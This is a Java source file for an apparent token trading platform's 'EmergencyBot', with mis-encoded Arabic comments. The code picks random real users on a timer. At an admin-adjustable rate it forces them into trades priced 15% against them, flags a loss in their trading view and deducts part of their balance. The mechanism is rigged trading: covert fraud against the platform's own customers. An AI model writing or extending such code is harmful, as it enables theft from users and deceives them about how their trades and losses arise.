package mazdady.bot;

import mazdady.trading.PriceEngine;
import mazdady.trading.TradingLineView;
import mazdady.user.User;
import mazdady.user.UserManager;
import mazdady.admin.AdminConfig;

import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;

/**
 * Ø¨ÙˆØª Ø§Ù„Ø·ÙˆØ§Ø±Ø¦ Ù…Ø¹ Ø¯Ø¹Ù… Ø§Ù„ØªØ­ÙƒÙ… Ø§Ù„Ø¯ÙŠÙ†Ø§Ù…ÙŠÙƒÙŠ ÙÙŠ Ø§Ù„Ø®Ø³Ø§Ø¦Ø±
 * ÙŠØªØ¨Ø¹ Ù†Ù…Ø· Strategy Ù„ÙØµÙ„ Ø§Ø³ØªØ±Ø§ØªÙŠØ¬ÙŠØ§Øª Ø§Ù„ØªØ­ÙƒÙ…
 */
public final class EmergencyBot {
    private final PriceEngine priceEngine;
    private final TradingLineView tradingLineView;
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    private final AdminConfig adminConfig;
    private volatile boolean isActive = false;
    private volatile double lossRate = 0.33; // 33% Ø®Ø³Ø§Ø±Ø© Ø§ÙØªØ±Ø§Ø¶ÙŠÙ‹Ø§
    private volatile long tradeInterval = 30000; // 30 Ø«Ø§Ù†ÙŠØ© Ø¨ÙŠÙ† Ø§Ù„ØµÙÙ‚Ø§Øª
    private static EmergencyBot instance;

    private EmergencyBot(PriceEngine priceEngine, TradingLineView tradingLineView) {
        this.priceEngine = priceEngine;
        this.tradingLineView = tradingLineView;
        this.adminConfig = AdminConfig.getInstance();
        loadEmergencyBotConfig();
    }

    public static synchronized EmergencyBot getInstance(PriceEngine priceEngine, TradingLineView tradingLineView) {
        if (instance == null) {
            instance = new EmergencyBot(priceEngine, tradingLineView);
        }
        return instance;
    }

    /**
     * ØªØ­Ù…ÙŠÙ„ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨ÙˆØª Ø§Ù„Ø·ÙˆØ§Ø±Ø¦ Ù…Ù† Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¥Ø¯Ø§Ø±ÙŠØ©
     */
    private void loadEmergencyBotConfig() {
        try {
            AdminConfig.EmergencyBotConfig config = adminConfig.getEmergencyBotConfig();
            this.lossRate = config.getLossRate();
            this.tradeInterval = config.getTradeInterval();
            System.out.println("EMERGENCY BOT: Config loaded - Loss Rate: " + 
                             String.format("%.2f", lossRate * 100) + "%, Interval: " + tradeInterval + "ms");
        } catch (Exception e) {
            System.err.println("EMERGENCY BOT CONFIG ERROR: " + e.getMessage());
        }
    }

    /**
     * ØªÙØ¹ÙŠÙ„ Ø¨ÙˆØª Ø§Ù„Ø·ÙˆØ§Ø±Ø¦
     */
    public void activateEmergencyBot() {
        if (isActive) {
            System.out.println("EMERGENCY BOT: Already active");
            return;
        }
        
        isActive = true;
        System.out.println("ğŸš¨ EMERGENCY BOT: ACTIVATED - Loss Rate: " + 
                         String.format("%.2f", lossRate * 100) + "%");
        
        // Ø¨Ø¯Ø¡ ØªÙ†ÙÙŠØ° Ø§Ù„ØµÙÙ‚Ø§Øª Ø§Ù„Ù…ÙØ­ÙƒÙ…Ø©
        startControlledLossTrading();
    }

    /**
     * ØªØ¹Ø·ÙŠÙ„ Ø¨ÙˆØª Ø§Ù„Ø·ÙˆØ§Ø±Ø¦
     */
    public void deactivateEmergencyBot() {
        if (!isActive) {
            System.out.println("EMERGENCY BOT: Already inactive");
            return;
        }
        
        isActive = false;
        scheduler.shutdown();
        System.out.println("ğŸš¨ EMERGENCY BOT: DEACTIVATED");
    }

    /**
     * Ø¨Ø¯Ø¡ Ø§Ù„ØªØ¯Ø§ÙˆÙ„ Ø§Ù„Ù…ÙØ­ÙƒÙ… Ø¨Ø§Ù„Ø®Ø³Ø§Ø¦Ø±
     */
    private void startControlledLossTrading() {
        scheduler.scheduleAtFixedRate(
            this::executeControlledLossTrade,
            0,
            tradeInterval,
            TimeUnit.MILLISECONDS
        );
        
        System.out.println("EMERGENCY BOT: Controlled loss trading started");
    }

    /**
     * ØªÙ†ÙÙŠØ° ØµÙÙ‚Ø© Ù…ÙØ­ÙƒÙ…Ø© Ø¨Ø§Ù„Ø®Ø³Ø§Ø¦Ø±
     */
    private void executeControlledLossTrade() {
        if (!isActive) return;
        
        try {
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠÙŠÙ†
            List<User> realUsers = UserManager.getInstance(null).getAllUsers();
            if (realUsers.isEmpty()) return;
            
            // Ø§Ø®ØªÙŠØ§Ø± Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ø´ÙˆØ§Ø¦ÙŠ
            User randomUser = realUsers.get(ThreadLocalRandom.current().nextInt(realUsers.size()));
            
            // ØªØ­Ø¯ÙŠØ¯ Ù†ÙˆØ¹ Ø§Ù„ØµÙÙ‚Ø© (Ø´Ø±Ø§Ø¡ Ø£Ùˆ Ø¨ÙŠØ¹)
            boolean isBuy = ThreadLocalRandom.current().nextBoolean();
            
            // ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…Ø¨Ù„Øº (Ø¹Ø´ÙˆØ§Ø¦ÙŠ Ø¨ÙŠÙ† 10 Ùˆ 100 MAZDADY)
            double amount = ThreadLocalRandom.current().nextDouble(10, 100);
            
            // ØªØ­Ø¯ÙŠØ¯ Ù…Ø§ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„ØµÙÙ‚Ø© Ø³ØªÙƒÙˆÙ† Ø®Ø§Ø³Ø±Ø©
            boolean shouldLose = shouldTradeBeLoss();
            
            if (shouldLose) {
                // ØªÙ†ÙÙŠØ° ØµÙÙ‚Ø© Ø®Ø§Ø³Ø±Ø©
                executeLossyTrade(randomUser, isBuy, amount);
            } else {
                // ØªÙ†ÙÙŠØ° ØµÙÙ‚Ø© Ø¹Ø§Ø¯ÙŠØ©
                executeNormalTrade(randomUser, isBuy, amount);
            }
            
        } catch (Exception e) {
            System.err.println("EMERGENCY BOT TRADE ERROR: " + e.getMessage());
        }
    }

    /**
     * ØªØ­Ø¯ÙŠØ¯ Ù…Ø§ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„ØµÙÙ‚Ø© Ø³ØªÙƒÙˆÙ† Ø®Ø§Ø³Ø±Ø©
     */
    private boolean shouldTradeBeLoss() {
        // Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù†Ø³Ø¨Ø© Ø§Ù„Ù…Ø¦ÙˆÙŠØ© Ø§Ù„Ù…Ø­Ø¯Ø¯Ø© Ù…Ù† Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
        return ThreadLocalRandom.current().nextDouble() < lossRate;
    }

    /**
     * ØªÙ†ÙÙŠØ° ØµÙÙ‚Ø© Ø®Ø§Ø³Ø±Ø©
     */
    private void executeLossyTrade(User user, boolean isBuy, double amount) {
        try {
            String userId = user.getUserId();
            
            if (isBuy) {
                // Ø´Ø±Ø§Ø¡ Ø¨Ø³Ø¹Ø± Ù…Ø±ØªÙØ¹ (Ø®Ø³Ø§Ø±Ø© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…)
                double inflatedPrice = priceEngine.getCurrentPrice() * 1.15; // 15% Ø²ÙŠØ§Ø¯Ø© Ø³Ø¹Ø±
                priceEngine.executeBuyOrder(userId, amount * inflatedPrice);
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ù…Ø¤Ø´Ø± Ø®Ø³Ø§Ø±Ø© ÙÙŠ ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ØªØ¯Ø§ÙˆÙ„
                tradingLineView.showLossIndicator(userId, amount, "BUY_AT_HIGH_PRICE");
                
                System.out.println("ğŸš¨ EMERGENCY BOT: LOSSY BUY - User " + userId + 
                                 " bought at inflated price (" + String.format("%.2f", inflatedPrice) + ")");
            } else {
                // Ø¨ÙŠØ¹ Ø¨Ø³Ø¹Ø± Ù…Ù†Ø®ÙØ¶ (Ø®Ø³Ø§Ø±Ø© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…)
                double deflatedPrice = priceEngine.getCurrentPrice() * 0.85; // 15% Ø§Ù†Ø®ÙØ§Ø¶ Ø³Ø¹Ø±
                priceEngine.executeSellOrder(userId, amount * deflatedPrice);
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ù…Ø¤Ø´Ø± Ø®Ø³Ø§Ø±Ø© ÙÙŠ ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ØªØ¯Ø§ÙˆÙ„
                tradingLineView.showLossIndicator(userId, amount, "SELL_AT_LOW_PRICE");
                
                System.out.println("ğŸš¨ EMERGENCY BOT: LOSSY SELL - User " + userId + 
                                 " sold at deflated price (" + String.format("%.2f", deflatedPrice) + ")");
            }
            
            // Ø®ØµÙ… Ø§Ù„Ø±ØµÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (ÙÙŠ Ø§Ù„Ø¥Ù†ØªØ§Ø¬)
            user.setBalance(user.getBalance() - (amount * 0.1)); // Ø®Ø³Ø§Ø±Ø© 10% Ù…Ù† Ø§Ù„ØµÙÙ‚Ø©
            
        } catch (Exception e) {
            System.err.println("LOSSY TRADE ERROR: " + e.getMessage());
        }
    }

    /**
     * ØªÙ†ÙÙŠØ° ØµÙÙ‚Ø© Ø¹Ø§Ø¯ÙŠØ©
     */
    private void executeNormalTrade(User user, boolean isBuy, double amount) {
        try {
            String userId = user.getUserId();
            
            if (isBuy) {
                priceEngine.executeBuyOrder(userId, amount);
                System.out.println("EMERGENCY BOT: NORMAL BUY - User " + userId + " bought " + amount + " MAZDADY");
            } else {
                priceEngine.executeSellOrder(userId, amount);
                System.out.println("EMERGENCY BOT: NORMAL SELL - User " + userId + " sold " + amount + " MAZDADY");
            }
            
        } catch (Exception e) {
            System.err.println("NORMAL TRADE ERROR: " + e.getMessage());
        }
    }

    /**
     * ØªØ­Ø¯ÙŠØ« Ù†Ø³Ø¨Ø© Ø§Ù„Ø®Ø³Ø§Ø¦Ø± Ù…Ù† Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
     */
    public void updateLossRate(double newLossRate) {
        if (newLossRate < 0 || newLossRate > 1.0) {
            System.err.println("EMERGENCY BOT: Invalid loss rate - must be between 0 and 1");
            return;
        }
        
        this.lossRate = newLossRate;
        System.out.println("ğŸš¨ EMERGENCY BOT: Loss rate updated to " + 
                         String.format("%.2f", newLossRate * 100) + "%");
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¥Ø¯Ø§Ø±ÙŠØ©
        adminConfig.getEmergencyBotConfig().setLossRate(newLossRate);
    }

    /**
     * ØªØ­Ø¯ÙŠØ« ÙØªØ±Ø© Ø§Ù„ØµÙÙ‚Ø§Øª
     */
    public void updateTradeInterval(long newIntervalMs) {
        if (newIntervalMs < 1000) {
            System.err.println("EMERGENCY BOT: Invalid interval - must be at least 1000ms");
            return;
        }
        
        this.tradeInterval = newIntervalMs;
        System.out.println("ğŸš¨ EMERGENCY BOT: Trade interval updated to " + newIntervalMs + "ms");
        
        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙˆÙ„Ø©
        if (isActive) {
            scheduler.shutdown();
            startControlledLossTrading();
        }
    }

    /**
     * Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø­Ø§Ù„Ø© Ø¨ÙˆØª Ø§Ù„Ø·ÙˆØ§Ø±Ø¦
     */
    public EmergencyBotStatus getStatus() {
        return new EmergencyBotStatus(
            isActive,
            lossRate,
            tradeInterval,
            scheduler.isShutdown() ? 0 : 1
        );
    }

    /**
     * Ø­Ø§Ù„Ø© Ø¨ÙˆØª Ø§Ù„Ø·ÙˆØ§Ø±Ø¦
     */
    public static final class EmergencyBotStatus {
        private final boolean active;
        private final double lossRate;
        private final long tradeInterval;
        private final int schedulerStatus;

        public EmergencyBotStatus(boolean active, double lossRate, long tradeInterval, int schedulerStatus) {
            this.active = active;
            this.lossRate = lossRate;
            this.tradeInterval = tradeInterval;
            this.schedulerStatus = schedulerStatus;
        }

        public boolean isActive() { return active; }
        public double getLossRate() { return lossRate; }
        public long getTradeInterval() { return tradeInterval; }
        public int getSchedulerStatus() { return schedulerStatus; }
        
        public String getFormattedLossRate() {
            return String.format("%.2f", lossRate * 100) + "%";
        }
        
        public String getFormattedTradeInterval() {
            return tradeInterval + "ms";
        }
    }

    /**
     * Ø¥ÙŠÙ‚Ø§Ù Ø¨ÙˆØª Ø§Ù„Ø·ÙˆØ§Ø±Ø¦ (Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª)
     */
    public void shutdown() {
        isActive = false;
        scheduler.shutdown();
        System.out.println("ğŸš¨ EMERGENCY BOT: Shutdown completed");
    }
}